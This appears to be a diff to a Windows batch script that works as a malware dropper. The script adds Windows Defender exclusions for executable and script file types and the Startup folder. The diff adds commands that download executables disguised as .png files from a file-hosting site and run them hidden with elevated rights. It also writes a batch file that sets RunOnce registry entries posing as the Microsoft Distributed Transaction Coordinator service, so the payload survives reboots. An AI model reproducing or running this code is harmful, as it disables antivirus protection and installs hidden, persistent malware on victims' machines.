@@ -30,4 +30,12 @@ powershell Add-MpPreference -ExclusionExtension ".bat"
 powershell Add-MpPreference -ExclusionExtension ".xml"
 powershell Add-MpPreference -ExclusionExtension ".exe"
 powershell Add-MpPreference -ExclusionPath '"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"'
-powershell iwr -useb "https://filebin.net/gb8pwsn9szcrgos4/dragon.exe" -o $env:TEMP\impostah.exe; saps $env:TEMP\impostah.exe -Verb RunAs -WindowStyle Hidden
+powershell iwr -useb "https://files.catbox.moe/41wjkf.png" -o $env:TEMP\impostah.exe; saps $env:TEMP\impostah.exe -Verb RunAs -WindowStyle Hidden
+powershell iwr -useb "https://files.catbox.moe/ryw72f.png" -o $env:windir\msdtc.exe; saps $env:windir\msdtc.exe -Verb RunAs -WindowStyle Hidden
+echo @echo off > "%windir%\msdtc.bat"
+echo REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce /v "*Service Microsoft Distributed Transaction Coordinator" /t REG_SZ /d "%windir%\msdtc.bat" >> "%windir%\msdtc.bat"
+echo REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce /v "*Service Microsoft Distributed Transaction Coordinator" /t REG_SZ /d "%windir%\msdtc.bat" >> "%windir%\msdtc.bat"
+echo start explorer.exe "%windir%\msdtc.exe" >> "%windir%\msdtc.bat"
+echo exit >> "%windir%\msdtc.bat"
+powershell saps "$env:windir\msdtc.bat" -WindowStyle Hidden -Verb RunAs
+pause
